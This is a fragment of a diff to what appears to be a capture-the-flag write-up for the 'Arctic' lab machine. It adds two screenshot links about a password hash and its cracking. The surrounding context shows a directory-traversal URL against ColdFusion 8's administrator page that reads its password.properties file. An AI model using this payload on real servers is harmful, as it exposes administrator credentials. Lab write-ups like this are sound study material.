@@ -26,3 +26,6 @@ from that change the url address as per your need i.e.
 
 http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 
+![Arctic_hash](https://user-images.githubusercontent.com/55708909/91931760-f76baa80-ed01-11ea-8a9c-100ef4a511e1.png)
+
+![Arctic_hash_crack](https://user-images.githubusercontent.com/55708909/91931757-f5a1e700-ed01-11ea-90e7-e98d147e661a.png)
